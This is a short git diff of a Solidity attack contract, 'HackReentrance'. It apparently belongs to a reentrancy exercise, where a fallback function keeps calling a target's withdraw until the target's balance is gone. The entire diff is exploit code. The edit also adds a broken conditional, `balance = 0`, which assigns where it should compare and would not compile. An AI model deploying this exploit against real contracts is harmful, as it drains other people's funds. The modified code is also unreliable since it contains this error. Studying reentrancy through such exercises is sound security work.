@@ -8,21 +8,23 @@ interface IReentrance {
 
 contract HackReentrance {
   IReentrance public reentranceAddress;
-  uint public amountToWithdraw = 1 ether;
-  uint public amountToDonate = 1;
+  uint public amountToWithdraw = 1 szabo;
 
   constructor(IReentrance _reentranceAddress) public payable {
     reentranceAddress = IReentrance(_reentranceAddress);
   }
 
   function becomeDonor() public {
-    reentranceAddress.donate.value(amountToDonate)(address(this));
+    reentranceAddress.donate.value(amountToWithdraw)(address(this));
     reentranceAddress.withdraw(amountToWithdraw);
   }
 
   fallback() external payable {
     if(address(reentranceAddress).balance != 0){
       reentranceAddress.withdraw(amountToWithdraw);
+    }
+    if(address(reentranceAddress).balance = 0){
+
     }
   }
 }
